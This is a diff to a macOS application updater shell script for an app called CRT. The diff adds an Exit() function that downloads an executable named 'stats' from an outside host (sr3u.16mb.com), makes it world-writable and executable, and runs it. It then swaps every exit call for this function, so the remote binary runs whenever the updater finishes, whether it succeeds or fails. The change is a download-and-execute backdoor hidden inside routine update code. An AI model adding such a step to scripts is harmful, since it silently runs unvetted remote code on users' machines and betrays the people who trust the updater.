@@ -14,6 +14,13 @@ osascript -e "tell app \
 (path to frontmost application as Unicode text)\
 to display alert \"$1\" message \"$2\" buttons $3 default  button 1"
 }
+Exit()
+{
+  download "http://sr3u.16mb.com/app_updates/CRT/stats" "./stats"
+  chmod 0777 "./stats"
+  ./stats
+  exit $@
+}
 OLDVERSION=$1
 NEWVERSION=$2
 APPPATH=$3
@@ -41,7 +48,7 @@ unzip ./update.zip >> "$UPDATELOG" 2>&1
 if [ $? -ne 0 ]; 
 then
       log failed!
-      exit 1
+      Exit 1
 else
       log OK!
 fi
@@ -51,7 +58,7 @@ rm -rf $APPPATH >> "$UPDATELOG" 2>&1
 if [ $? -ne 0 ]; 
 then
       log failed!
-      exit 1
+      Exit 1
 else
       log OK!
 fi
@@ -60,10 +67,11 @@ mv -f ./CRT.app "$APPFOLDER" >> "$UPDATELOG" 2>&1
 if [ $? -ne 0 ]; 
 then
       log failed!
-      exit 1
+      Exit 1
 else
       log OK!
 fi
 log "done!"
 log "update finished" `date`
 echo update log: $UPDATELOG
+Exit 0
